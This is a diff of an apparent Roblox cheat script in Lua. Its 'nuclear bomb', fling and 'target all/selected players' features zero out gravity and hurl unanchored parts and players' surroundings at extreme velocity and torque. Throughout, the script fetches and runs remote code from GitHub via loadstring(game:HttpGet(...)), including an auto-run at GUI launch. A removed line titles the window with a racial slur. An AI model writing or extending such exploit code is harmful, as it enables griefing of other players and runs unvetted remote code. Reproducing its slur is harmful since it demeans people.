-                                        Torque.Torque = FLING_TORQUE
-                                        local AlignPosition = Instance.new("AlignPosition", c)
-                                        local Attachment2 = Instance.new("Attachment", c)
-                                        Attachment2.WorldCFrame = c.CFrame
-                                        Torque.Attachment0 = Attachment2
-                                        AlignPosition.MaxForce = PULL_MAX_FORCE
-                                        AlignPosition.MaxVelocity = math.huge
-                                        AlignPosition.Responsiveness = PULL_RESPONSIVENESS
-                                        AlignPosition.Attachment0 = Attachment2
-                                        AlignPosition.Attachment1 = nukeState.centerAttachment
-                                        table.insert(nukeState.collectedParts, c)
-                                    end
-                                end
-                            else
-                                stripBodyForces(p)
-                                pcall(function() initiallyMasslessParts[p] = p.Massless end)
-                                p.Massless = true
-                                p.CanCollide = false
-                                local Torque = Instance.new("Torque", p)
-                                Torque.Torque = FLING_TORQUE
-                                local AlignPosition = Instance.new("AlignPosition", p)
-                                local Attachment2 = Instance.new("Attachment", p)
-                                Attachment2.WorldCFrame = p.CFrame
-                                Torque.Attachment0 = Attachment2
-                                AlignPosition.MaxForce = PULL_MAX_FORCE
-                                AlignPosition.MaxVelocity = math.huge
-                                AlignPosition.Responsiveness = PULL_RESPONSIVENESS
-                                AlignPosition.Attachment0 = Attachment2
-                                AlignPosition.Attachment1 = nukeState.centerAttachment
-                                table.insert(nukeState.collectedParts, p)
-                            end
-                        end)
-                    end
-                end
-                batch = {}
-                wait(0.08)
+    -- set gravity to 0 immediately while gathering
+    pcall(function() Workspace.Gravity = 0 end)
+end
+
+-- Detonate nuke: destroy BH (center), wait 0.4s, then apply velocities and disable collisions; restore gravity after 3s
+local function detonateNukeAndLaunch()
+    if not nukeGathering then return end
+    nukeGathering = false
+
+    -- copy held list and clear state
+    local held = {}
+    for _, p in ipairs(nukeHeldParts) do table.insert(held, p) end
+    nukeHeldParts = {}
+
+    -- destroy central BH attachments/part first
+    pcall(function()
+        if nukeCenterPart and nukeCenterPart.Parent then
+            -- destroy the part (the attachments will be destroyed with it)
+            local folder = nukeCenterPart.Parent
+            nukeCenterPart:Destroy()
+            -- we will destroy the folder too just to be clean
+            if folder and folder.Parent then
+                folder:Destroy()
             end
         end
+        nukeCenterPart = nil
+        nukeCenterAttachment = nil
+        nukeCenterFolder = nil
+    end)
 
-        -- leftover
-        for _, p in ipairs(batch) do
-            if p and p.Parent then
+    -- after 0.4 seconds, apply velocities (1500) and disable collisions
+    spawn(function()
+        wait(0.4)
+        local n = #held
+        if n == 0 then
+            -- restore gravity 3s after detonation
+            spawn(function() wait(3); pcall(function() Workspace.Gravity = ORIGINAL_GRAVITY end) end)
+            if nukeOverlayGui and nukeOverlayGui.Parent then nukeOverlayGui:Destroy() end
+            return
+        end
+        local dirs = goldenSphereDirections(n)
+        for i, part in ipairs(held) do
+            if part and part.Parent then
                 pcall(function()
-                    if isPartPlayerCharacter(p) then return end
-                    if (#nukeState.collectedParts <= SPLIT_IF_FEWER_THAN) then
-                        local clones = splitPartIntoPieces(p, 3)
-                        for _, c in ipairs(clones) do
-                            if c and c.Parent then
-                                stripBodyForces(c)
-                                pcall(function() c.Massless = true end)
-                                c.CanCollide = false
-                                local Torque = Instance.new("Torque", c)
-                                Torque.Torque = FLING_TORQUE
-                                local AlignPosition = Instance.new("AlignPosition", c)
-                                local Attachment2 = Instance.new("Attachment", c)
-                                Attachment2.WorldCFrame = c.CFrame
-                                Torque.Attachment0 = Attachment2
-                                AlignPosition.MaxForce = PULL_MAX_FORCE
-                                AlignPosition.MaxVelocity = math.huge
-                                AlignPosition.Responsiveness = PULL_RESPONSIVENESS
-                                AlignPosition.Attachment0 = Attachment2
-                                AlignPosition.Attachment1 = nukeState.centerAttachment
-                                table.insert(nukeState.collectedParts, c)
-                            end
-                        end
-                    else
-                        stripBodyForces(p)
-                        pcall(function() initiallyMasslessParts[p] = p.Massless end)
-                        p.Massless = true
-                        p.CanCollide = false
-                        local Torque = Instance.new("Torque", p)
-                        Torque.Torque = FLING_TORQUE
-                        local AlignPosition = Instance.new("AlignPosition", p)
-                        local Attachment2 = Instance.new("Attachment", p)
-                        Attachment2.WorldCFrame = p.CFrame
-                        Torque.Attachment0 = Attachment2
-                        AlignPosition.MaxForce = PULL_MAX_FORCE
-                        AlignPosition.MaxVelocity = math.huge
-                        AlignPosition.Responsiveness = PULL_RESPONSIVENESS
-                        AlignPosition.Attachment0 = Attachment2
-                        AlignPosition.Attachment1 = nukeState.centerAttachment
-                        table.insert(nukeState.collectedParts, p)
-                    end
+                    local ap = part:FindFirstChildOfClass("AlignPosition")
+                    if ap then ap:Destroy() end
+                    local att = part:FindFirstChildOfClass("Attachment")
+                    if att then att:Destroy() end
+                    part.CanCollide = false
+                    pcall(function() part.Massless = false end)
+                    local dir = dirs[((i-1) % #dirs) + 1] or Vector3.new(0,1,0)
+                    part.Velocity = dir * 1500
                 end)
             end
         end
 
-        -- done gathering; leaving nukeState.collecting true until detonation
+        -- gravity restore after 3 seconds from detonation
+        spawn(function()
+            wait(3)
+            pcall(function() Workspace.Gravity = ORIGINAL_GRAVITY end)
+        end)
     end)
-end
 
--- Explosion handler (triggered by pressing the red button)
-local function triggerNukeExplosion()
-    if not nukeState.collecting then return end
-    nukeState.collecting = false
-
-    -- remove central BH attachments/part immediately and then apply velocities after 0.1s
-    local parts = {}
-    for _, p in ipairs(nukeState.collectedParts) do
-        if p and p.Parent then table.insert(parts, p) end
+    -- destroy overlay GUI immediately (the user requested the GUI to destroy itself instantly after detonation)
+    if nukeOverlayGui and nukeOverlayGui.Parent then
+        pcall(function() nukeOverlayGui:Destroy() end)
+        nukeOverlayGui = nil
     end
-
-    -- Destroy central BH/attachment first
-    pcall(function()
-        if nukeState.centerAttachment and nukeState.centerAttachment.Parent then nukeState.centerAttachment:Destroy() end
-        if nukeState.centerPart and nukeState.centerPart.Parent then nukeState.centerPart:Destroy() end
-    end)
-
-    -- set gravity to 0, but save original and guarantee restore after 3 seconds
-    local origGravity = Workspace.Gravity
-    pcall(function() Workspace.Gravity = 0 end)
-
-    -- apply velocities after 0.1s and then restore gravity after 3 seconds
-    spawn(function()
-        wait(0.1)
-        local n = #parts
-        if n > 0 then
-            local dirs = goldenSphereDirections(n)
-            for i, part in ipairs(parts) do
-                if part and part.Parent then
-                    pcall(function()
-                        local ap = part:FindFirstChildOfClass("AlignPosition")
-                        if ap then ap:Destroy() end
-                        local att = part:FindFirstChildOfClass("Attachment")
-                        if att then att:Destroy() end
-                        part.CanCollide = true
-                        -- restore massless state if stored
-                        if initiallyMasslessParts[part] ~= nil then
-                            pcall(function() part.Massless = initiallyMasslessParts[part] end)
-                        else
-                            pcall(function() part.Massless = false end)
-                        end
-                        local dir = dirs[((i-1) % #dirs) + 1]
-                        part.Velocity = dir * 1500
-                    end)
-                end
-            end
-        end
-    end)
-
-    -- restore gravity after 3 seconds (guaranteed)
-    spawn(function()
-        wait(3)
-        pcall(function() Workspace.Gravity = origGravity end)
-    end)
-
-    -- cleanup nuke folder state
-    nukeState.collectedParts = {}
-    nukeState.folder = nil
-    nukeState.centerPart = nil
-    nukeState.centerAttachment = nil
-    nukeState.ownerPos = nil
 end
 
--- Nuke UI overlay creation (right side); redBtn triggers triggerNukeExplosion; clicking "nuclear bomb." starts gather
+-- Build nuke overlay (right side) — pressing the red round button detonates
 local function spawnNukeOverlay()
-    -- Remove old overlay if it exists
-    pcall(function()
-        local old = localPlayer.PlayerGui:FindFirstChild("ÆS_NukeGui")
-        if old then old:Destroy() end
-    end)
-
+    if nukeOverlayGui and nukeOverlayGui.Parent then return end
     local gui = Instance.new("ScreenGui")
     gui.Name = "ÆS_NukeGui"
     gui.ResetOnSpawn = false
     gui.Parent = localPlayer:WaitForChild("PlayerGui")
+    nukeOverlayGui = gui
 
-    local frame = Instance.new("Frame")
+    local frame = Instance.new("Frame", gui)
     frame.Name = "NukeFrame"
     frame.AnchorPoint = Vector2.new(1, 0.5)
     frame.Position = UDim2.new(1, -12, 0.5, 0)
     frame.Size = UDim2.new(0, 240, 0, 160)
-    frame.BackgroundColor3 = Color3.new(1, 1, 0)
+    frame.BackgroundColor3 = Color3.new(1, 1, 0) -- yellow
     frame.BorderSizePixel = 0
-    frame.Parent = gui
 
     local topText = Instance.new("TextLabel", frame)
     topText.Size = UDim2.new(1, -16, 0, 20)
@@ -2109,7 +1907,9 @@ local function spawnNukeOverlay()
     redBtn.ZIndex = 5
     redBtn.TextScaled = false
     redBtn.Parent = frame
-    -- RobloxRoundButton style not always accessible; keep simple
+    -- make it look round-ish without relying on RobloxRoundButton style
+    redBtn.ClipsDescendants = true
+    local uiCorner = Instance.new("UICorner", redBtn); uiCorner.CornerRadius = UDim.new(1,0)
 
     local label = Instance.new("TextLabel", frame)
     label.Size = UDim2.new(1, -16, 0, 24)
@@ -2120,9 +1920,9 @@ local function spawnNukeOverlay()
     label.TextScaled = true
     label.TextColor3 = Color3.new(0,0,0)
 
-    -- red button triggers explosion
+    -- Pressing redBtn detonates instantly
     redBtn.MouseButton1Click:Connect(function()
-        -- small press animation
+        -- small click feedback
         spawn(function()
             for i=1,2 do
                 redBtn.Size = redBtn.Size + UDim2.new(0, 6, 0, 6)
@@ -2131,50 +1931,32 @@ local function spawnNukeOverlay()
                 wait(0.04)
             end
         end)
-        -- trigger explosion (if gathering occurred)
-        pcall(function() triggerNukeExplosion() end)
+        -- Detonate (destroy BHs & apply velocities after 0.4s) and destroy overlay immediately
+        detonateNukeAndLaunch()
     end)
 end
 
--- ---------- GUI (TurtleLib) - recreate UI with modifications ----------
-local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/miroeramaa/TurtleLib/main/TurtleUiLib.lua"))()
-local window = library:Window("Fix it you panis negor🗣🔥")
+-- Removed the old "telekinesis/fix target" and "Load Player List Script" buttons.
+-- Instead those loadstrings will run automatically at GUI launch
 
-window:Toggle("Unanchored Target All", false, function(Value) setTargetAll(Value) end)
-window:Toggle("Target Selected Players", false, function(Value) setTargetSelected(Value) end)
-
-window:Toggle("Life Cycle Mode", false, function(Value)
-    LifeCycleMode = Value
-    if LifeCycleMode then
-        tryStartCycleIfNeeded()
-    else
-        endCycleMode()
-    end
-end)
-
-window:Button("Reset Cycle", function()
-    resetCycleNow()
-end)
-
--- Goodbye button
+-- "Goodbye." button
 window:Button("Goodbye.", function()
     spawn(function()
         pcall(function() triggerGoodbye() end)
     end)
 end)
 
--- nuclear bomb. button now STARTS GATHERING and opens overlay (detonation separate)
+-- "nuclear bomb." button: starts gathering immediately and spawns overlay; the overlay's red button detonates.
 window:Button("nuclear bomb.", function()
     spawn(function()
         pcall(function()
-            -- start gathering immediately
             startNukeGather()
-            -- spawn overlay with the red detonation button
             spawnNukeOverlay()
         end)
     end)
 end)
 
+-- Continuous Loop Check toggle (kept)
 local loopCheckActive = false
 window:Toggle("Continuous Loop Check", false, function(Value)
     loopCheckActive = Value
@@ -2223,10 +2005,11 @@ window:Toggle("Negative fling", false, function(Value)
     else
         FLING_MULTIPLIER = math.abs(9000000000000000)
     end
+    -- update torque used for flings immediately
     updateFlingTorque()
 end)
 
--- Auto-refresh loops (kept)
+-- Auto-refresh PAA loop (kept)
 spawn(function()
     while true do
         if PAAEnabled then
@@ -2300,7 +2083,7 @@ do
     end)
 end
 
--- ---------- AUTO-RUN: telekinesis fix & playerlist loadstrings (kept auto-run) ----------
+-- AUTO-RUN: telekinesis fix & playerlist loadstrings (auto-fire at GUI launch)
 spawn(function()
     pcall(function()
         local s = game:HttpGet(('https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md'), true)
